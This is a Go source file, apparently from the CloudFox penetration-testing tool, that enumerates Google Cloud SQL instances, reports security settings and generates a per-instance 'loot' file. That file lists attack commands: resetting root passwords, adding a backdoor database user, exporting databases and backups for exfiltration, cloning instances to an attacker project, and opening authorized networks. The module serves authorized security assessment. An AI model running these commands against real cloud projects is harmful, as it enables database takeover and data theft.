package commands

import (
	"github.com/BishopFox/cloudfox/gcp/shared"
	"context"
	"fmt"
	"strings"
	"sync"

	CloudSQLService "github.com/BishopFox/cloudfox/gcp/services/cloudsqlService"
	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	gcpinternal "github.com/BishopFox/cloudfox/internal/gcp"
	"github.com/spf13/cobra"
)

var GCPCloudSQLCommand = &cobra.Command{
	Use:     globals.GCP_CLOUDSQL_MODULE_NAME,
	Aliases: []string{"sql", "database", "db"},
	Short:   "Enumerate Cloud SQL instances with security analysis",
	Long: `Enumerate Cloud SQL instances across projects with security-relevant details.

Features:
- Lists all Cloud SQL instances (MySQL, PostgreSQL, SQL Server)
- Shows network configuration (public/private IP, authorized networks)
- Identifies publicly accessible databases
- Shows SSL/TLS configuration and requirements
- Checks backup and high availability configuration
- Shows encryption type (Google-managed vs CMEK)
- Shows IAM database authentication status
- Shows password policy configuration
- Shows maintenance window settings
- Shows point-in-time recovery status
- Identifies common security misconfigurations
- Generates gcloud commands for further analysis

Security Columns:
- PublicIP: Whether the instance has a public IP address
- RequireSSL: Whether SSL/TLS is required for connections
- AuthNetworks: Number of authorized network ranges
- Backups: Automated backup status
- PITR: Point-in-time recovery status
- Encryption: CMEK or Google-managed
- IAM Auth: IAM database authentication
- PwdPolicy: Password validation policy
- HA: High availability configuration
- Issues: Detected security misconfigurations

Attack Surface:
- Public IPs expose database to internet scanning
- Missing SSL allows credential sniffing
- 0.0.0.0/0 in authorized networks = world accessible
- Default service accounts may have excessive permissions
- Google-managed encryption may not meet compliance
- Missing password policy allows weak passwords`,
	Run: runGCPCloudSQLCommand,
}

// ------------------------------
// Module Struct
// ------------------------------
type CloudSQLModule struct {
	gcpinternal.BaseGCPModule

	// Module-specific fields - per-project for hierarchical output
	ProjectInstances map[string][]CloudSQLService.SQLInstanceInfo // projectID -> instances
	LootMap          map[string]map[string]*internal.LootFile     // projectID -> loot files
	mu               sync.Mutex
}

// ------------------------------
// Output Struct
// ------------------------------
type CloudSQLOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o CloudSQLOutput) TableFiles() []internal.TableFile { return o.Table }
func (o CloudSQLOutput) LootFiles() []internal.LootFile   { return o.Loot }

// ------------------------------
// Command Entry Point
// ------------------------------
func runGCPCloudSQLCommand(cmd *cobra.Command, args []string) {
	cmdCtx, err := gcpinternal.InitializeCommandContext(cmd, globals.GCP_CLOUDSQL_MODULE_NAME)
	if err != nil {
		return
	}

	module := &CloudSQLModule{
		BaseGCPModule:    gcpinternal.NewBaseGCPModule(cmdCtx),
		ProjectInstances: make(map[string][]CloudSQLService.SQLInstanceInfo),
		LootMap:          make(map[string]map[string]*internal.LootFile),
	}

	module.Execute(cmdCtx.Ctx, cmdCtx.Logger)
}

// ------------------------------
// Module Execution
// ------------------------------
func (m *CloudSQLModule) Execute(ctx context.Context, logger internal.Logger) {
	m.RunProjectEnumeration(ctx, logger, m.ProjectIDs, globals.GCP_CLOUDSQL_MODULE_NAME, m.processProject)

	// Get all instances for stats
	allInstances := m.getAllInstances()
	if len(allInstances) == 0 {
		logger.InfoM("No Cloud SQL instances found", globals.GCP_CLOUDSQL_MODULE_NAME)
		return
	}

	// Count public instances
	publicCount := 0
	for _, instance := range allInstances {
		if instance.HasPublicIP {
			publicCount++
		}
	}

	if publicCount > 0 {
		logger.SuccessM(fmt.Sprintf("Found %d instance(s), %d with public IP", len(allInstances), publicCount), globals.GCP_CLOUDSQL_MODULE_NAME)
	} else {
		logger.SuccessM(fmt.Sprintf("Found %d instance(s)", len(allInstances)), globals.GCP_CLOUDSQL_MODULE_NAME)
	}

	m.writeOutput(ctx, logger)
}

// getAllInstances returns all instances from all projects (for statistics)
func (m *CloudSQLModule) getAllInstances() []CloudSQLService.SQLInstanceInfo {
	var all []CloudSQLService.SQLInstanceInfo
	for _, instances := range m.ProjectInstances {
		all = append(all, instances...)
	}
	return all
}

// ------------------------------
// Project Processor
// ------------------------------
func (m *CloudSQLModule) processProject(ctx context.Context, projectID string, logger internal.Logger) {
	if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
		logger.InfoM(fmt.Sprintf("Enumerating Cloud SQL instances in project: %s", projectID), globals.GCP_CLOUDSQL_MODULE_NAME)
	}

	cs := CloudSQLService.New()
	instances, err := cs.Instances(projectID)
	if err != nil {
		m.CommandCounter.Error++
		gcpinternal.HandleGCPError(err, logger, globals.GCP_CLOUDSQL_MODULE_NAME,
			fmt.Sprintf("Could not enumerate Cloud SQL in project %s", projectID))
		return
	}

	// Thread-safe store per-project
	m.mu.Lock()
	m.ProjectInstances[projectID] = instances

	// Initialize loot for this project
	if m.LootMap[projectID] == nil {
		m.LootMap[projectID] = make(map[string]*internal.LootFile)
		m.LootMap[projectID]["cloudsql-commands"] = &internal.LootFile{
			Name:     "cloudsql-commands",
			Contents: "# Cloud SQL Commands\n# Generated by CloudFox\n# WARNING: Only use with proper authorization\n\n",
		}
	}

	for _, instance := range instances {
		m.addInstanceToLoot(projectID, instance)
	}
	m.mu.Unlock()

	if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
		logger.InfoM(fmt.Sprintf("Found %d instance(s) in project %s", len(instances), projectID), globals.GCP_CLOUDSQL_MODULE_NAME)
	}
}

// ------------------------------
// Loot File Management
// ------------------------------
func (m *CloudSQLModule) addInstanceToLoot(projectID string, instance CloudSQLService.SQLInstanceInfo) {
	lootFile := m.LootMap[projectID]["cloudsql-commands"]
	if lootFile == nil {
		return
	}

	dbType := getDatabaseType(instance.DatabaseVersion)
	connectionInstance := fmt.Sprintf("%s:%s:%s", instance.ProjectID, instance.Region, instance.Name)

	publicIP := instance.PublicIP
	if publicIP == "" {
		publicIP = "-"
	}

	lootFile.Contents += fmt.Sprintf(
		"# =============================================================================\n"+
			"# CLOUD SQL: %s\n"+
			"# =============================================================================\n"+
			"# Project: %s, Region: %s\n"+
			"# Version: %s\n"+
			"# Public IP: %s\n",
		instance.Name,
		instance.ProjectID, instance.Region,
		instance.DatabaseVersion,
		publicIP,
	)

	// gcloud commands
	lootFile.Contents += "# === ENUMERATION COMMANDS ===\n\n"
	lootFile.Contents += fmt.Sprintf(
		"gcloud sql instances describe %s --project=%s\n"+
			"gcloud sql databases list --instance=%s --project=%s\n"+
			"gcloud sql users list --instance=%s --project=%s\n",
		instance.Name, instance.ProjectID,
		instance.Name, instance.ProjectID,
		instance.Name, instance.ProjectID,
	)

	// Connection commands based on database type
	switch dbType {
	case "mysql":
		if instance.PublicIP != "" {
			lootFile.Contents += fmt.Sprintf(
				"mysql -h %s -u root -p\n",
				instance.PublicIP,
			)
		}
		lootFile.Contents += fmt.Sprintf(
			"cloud_sql_proxy -instances=%s=tcp:3306\n",
			connectionInstance,
		)
	case "postgres":
		if instance.PublicIP != "" {
			lootFile.Contents += fmt.Sprintf(
				"psql -h %s -U postgres\n",
				instance.PublicIP,
			)
		}
		lootFile.Contents += fmt.Sprintf(
			"cloud_sql_proxy -instances=%s=tcp:5432\n",
			connectionInstance,
		)
	case "sqlserver":
		if instance.PublicIP != "" {
			lootFile.Contents += fmt.Sprintf(
				"sqlcmd -S %s -U sqlserver\n",
				instance.PublicIP,
			)
		}
		lootFile.Contents += fmt.Sprintf(
			"cloud_sql_proxy -instances=%s=tcp:1433\n",
			connectionInstance,
		)
	}

	// === EXPLOIT COMMANDS ===
	lootFile.Contents += "\n# === EXPLOIT COMMANDS ===\n\n"

	// Password reset
	lootFile.Contents += fmt.Sprintf(
		"# Reset database user password (requires cloudsql.users.update):\n"+
			"gcloud sql users set-password root --host=%% --instance=%s --project=%s --password=NEW_PASSWORD\n"+
			"gcloud sql users set-password postgres --instance=%s --project=%s --password=NEW_PASSWORD\n\n",
		instance.Name, instance.ProjectID,
		instance.Name, instance.ProjectID,
	)

	// Create new user
	lootFile.Contents += fmt.Sprintf(
		"# Create a new database user (requires cloudsql.users.create):\n"+
			"gcloud sql users create cloudfox_user --instance=%s --project=%s --password=GENERATED_PASSWORD\n\n",
		instance.Name, instance.ProjectID,
	)

	// Backup exfiltration
	lootFile.Contents += fmt.Sprintf(
		"# List existing backups:\n"+
			"gcloud sql backups list --instance=%s --project=%s\n\n"+
			"# Create a new backup (for exfiltration):\n"+
			"gcloud sql backups create --instance=%s --project=%s\n\n"+
			"# Export database to GCS bucket (data exfiltration):\n"+
			"gcloud sql export sql %s gs://BUCKET_NAME/export-%s.sql --database=DATABASE_NAME --project=%s\n"+
			"gcloud sql export csv %s gs://BUCKET_NAME/export-%s.csv --database=DATABASE_NAME --query=\"SELECT * FROM TABLE_NAME\" --project=%s\n\n",
		instance.Name, instance.ProjectID,
		instance.Name, instance.ProjectID,
		instance.Name, instance.Name, instance.ProjectID,
		instance.Name, instance.Name, instance.ProjectID,
	)

	// Clone instance
	lootFile.Contents += fmt.Sprintf(
		"# Clone instance to attacker-controlled project (requires cloudsql.instances.clone):\n"+
			"gcloud sql instances clone %s %s-clone --project=%s\n\n",
		instance.Name, instance.Name, instance.ProjectID,
	)

	// IAM authentication exploitation
	if instance.IAMAuthentication {
		lootFile.Contents += fmt.Sprintf(
			"# IAM database authentication is enabled - connect using SA token:\n"+
				"gcloud sql generate-login-token | %s\n\n",
			func() string {
				switch dbType {
				case "mysql":
					return fmt.Sprintf("mysql -h %s -u SA_EMAIL --enable-cleartext-plugin --password=$(cat -)", connectionInstance)
				case "postgres":
					return fmt.Sprintf("PGPASSWORD=$(cat -) psql -h %s -U SA_EMAIL", connectionInstance)
				default:
					return "# Use the token as password for database connection"
				}
			}(),
		)
	}

	// Authorized network manipulation
	lootFile.Contents += fmt.Sprintf(
		"# Add your IP to authorized networks (requires cloudsql.instances.update):\n"+
			"gcloud sql instances patch %s --project=%s --authorized-networks=YOUR_IP/32\n\n",
		instance.Name, instance.ProjectID,
	)

	// Surface security issues if any were detected
	if len(instance.SecurityIssues) > 0 {
		lootFile.Contents += "# Security Issues:\n"
		for _, issue := range instance.SecurityIssues {
			lootFile.Contents += fmt.Sprintf("#   - %s\n", issue)
		}
	}

	lootFile.Contents += "\n"
}

// getDatabaseType returns the database type from version string
func getDatabaseType(version string) string {
	switch {
	case strings.HasPrefix(version, "MYSQL"):
		return "mysql"
	case strings.HasPrefix(version, "POSTGRES"):
		return "postgres"
	case strings.HasPrefix(version, "SQLSERVER"):
		return "sqlserver"
	default:
		return "unknown"
	}
}

// ------------------------------
// Output Generation
// ------------------------------
func (m *CloudSQLModule) writeOutput(ctx context.Context, logger internal.Logger) {
	// Decide between hierarchical and flat output
	if m.Hierarchy != nil && !m.FlatOutput {
		m.writeHierarchicalOutput(ctx, logger)
	} else {
		m.writeFlatOutput(ctx, logger)
	}
}

// writeHierarchicalOutput writes output to per-project directories
func (m *CloudSQLModule) writeHierarchicalOutput(ctx context.Context, logger internal.Logger) {
	header := m.getTableHeader()

	// Build hierarchical output data
	outputData := internal.HierarchicalOutputData{
		OrgLevelData:     make(map[string]internal.CloudfoxOutput),
		ProjectLevelData: make(map[string]internal.CloudfoxOutput),
	}

	// Build project-level outputs
	for projectID, instances := range m.ProjectInstances {
		body := m.instancesToTableBody(instances)
		tables := []internal.TableFile{{
			Name:   globals.GCP_CLOUDSQL_MODULE_NAME,
			Header: header,
			Body:   body,
		}}

		// Collect loot for this project
		var lootFiles []internal.LootFile
		if projectLoot, ok := m.LootMap[projectID]; ok {
			for _, loot := range projectLoot {
				if loot != nil && loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# WARNING: Only use with proper authorization\n\n") {
					lootFiles = append(lootFiles, *loot)
				}
			}
		}

		outputData.ProjectLevelData[projectID] = CloudSQLOutput{Table: tables, Loot: lootFiles}
	}

	// Create path builder using the module's hierarchy
	pathBuilder := m.BuildPathBuilder()

	// Write using hierarchical output
	err := internal.HandleHierarchicalOutputSmart(
		"gcp",
		m.Format,
		m.Verbosity,
		m.WrapTable,
		pathBuilder,
		outputData,
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing hierarchical output: %v", err), globals.GCP_CLOUDSQL_MODULE_NAME)
		m.CommandCounter.Error++
	}
}

// writeFlatOutput writes all output to a single directory (legacy mode)
func (m *CloudSQLModule) writeFlatOutput(ctx context.Context, logger internal.Logger) {
	header := m.getTableHeader()
	allInstances := m.getAllInstances()
	body := m.instancesToTableBody(allInstances)

	// Collect all loot files
	var lootFiles []internal.LootFile
	for _, projectLoot := range m.LootMap {
		for _, loot := range projectLoot {
			if loot != nil && loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# WARNING: Only use with proper authorization\n\n") {
				lootFiles = append(lootFiles, *loot)
			}
		}
	}

	tableFiles := []internal.TableFile{{
		Name:   globals.GCP_CLOUDSQL_MODULE_NAME,
		Header: header,
		Body:   body,
	}}

	output := CloudSQLOutput{
		Table: tableFiles,
		Loot:  lootFiles,
	}

	scopeNames := make([]string, len(m.ProjectIDs))
	for i, id := range m.ProjectIDs {
		scopeNames[i] = m.GetProjectName(id)
	}

	err := internal.HandleOutputSmart(
		"gcp",
		m.Format,
		m.OutputDirectory,
		m.Verbosity,
		m.WrapTable,
		"project",
		m.ProjectIDs,
		scopeNames,
		m.Account,
		output,
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), globals.GCP_CLOUDSQL_MODULE_NAME)
		m.CommandCounter.Error++
	}
}

// getTableHeader returns the table header for Cloud SQL instances
func (m *CloudSQLModule) getTableHeader() []string {
	return []string{
		"Project Name",
		"Project ID",
		"Name",
		"Region",
		"Database",
		"Tier",
		"Public IP",
		"Private IP",
		"SSL",
		"Backups",
		"PITR",
		"Encrypt",
		"IAM Auth",
		"PwdPolicy",
		"HA",
		"Auth Network",
		"CIDR",
		"Public Access",
	}
}

// instancesToTableBody converts instances to table body rows
func (m *CloudSQLModule) instancesToTableBody(instances []CloudSQLService.SQLInstanceInfo) [][]string {
	var body [][]string
	for _, instance := range instances {
		// Format encryption type
		encryptionDisplay := instance.EncryptionType
		if encryptionDisplay == "" || encryptionDisplay == "Google-managed" {
			encryptionDisplay = "Google"
		}

		// Format public/private IPs
		publicIP := instance.PublicIP
		if publicIP == "" {
			publicIP = "-"
		}
		privateIP := instance.PrivateIP
		if privateIP == "" {
			privateIP = "-"
		}

		// If instance has authorized networks, create one row per network
		if len(instance.AuthorizedNetworks) > 0 {
			for _, network := range instance.AuthorizedNetworks {
				publicAccess := "No"
				if network.IsPublic {
					publicAccess = "YES - WORLD ACCESSIBLE"
				}

				networkName := network.Name
				if networkName == "" {
					networkName = "-"
				}

				body = append(body, []string{
					m.GetProjectName(instance.ProjectID),
					instance.ProjectID,
					instance.Name,
					instance.Region,
					instance.DatabaseVersion,
					instance.Tier,
					publicIP,
					privateIP,
					shared.BoolToYesNo(instance.RequireSSL),
					shared.BoolToYesNo(instance.BackupEnabled),
					shared.BoolToYesNo(instance.PointInTimeRecovery),
					encryptionDisplay,
					shared.BoolToYesNo(instance.IAMAuthentication),
					shared.BoolToYesNo(instance.PasswordPolicyEnabled),
					instance.AvailabilityType,
					networkName,
					network.Value,
					publicAccess,
				})
			}
		} else {
			// Instance has no authorized networks - single row
			body = append(body, []string{
				m.GetProjectName(instance.ProjectID),
				instance.ProjectID,
				instance.Name,
				instance.Region,
				instance.DatabaseVersion,
				instance.Tier,
				publicIP,
				privateIP,
				shared.BoolToYesNo(instance.RequireSSL),
				shared.BoolToYesNo(instance.BackupEnabled),
				shared.BoolToYesNo(instance.PointInTimeRecovery),
				encryptionDisplay,
				shared.BoolToYesNo(instance.IAMAuthentication),
				shared.BoolToYesNo(instance.PasswordPolicyEnabled),
				instance.AvailabilityType,
				"-",
				"-",
				"-",
			})
		}
	}
	return body
}
